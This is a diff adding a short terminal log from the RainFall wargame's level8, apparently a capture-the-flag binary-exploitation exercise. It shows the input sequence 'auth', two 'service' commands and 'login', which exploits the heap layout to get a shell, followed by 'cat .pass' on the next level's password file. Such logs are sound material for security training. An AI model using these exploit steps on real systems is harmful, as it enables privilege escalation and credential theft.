@@ -1,0 +1,15 @@
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+service
+0x804a008, 0x804a018 
+service
+0x804a008, 0x804a028 
+login
+$ cd user9
+/bin/sh: 1: cd: can't cd to user9
+$ pwd
+/home/user/level8
+$ cd /home/user/level9
+$ cat .pass
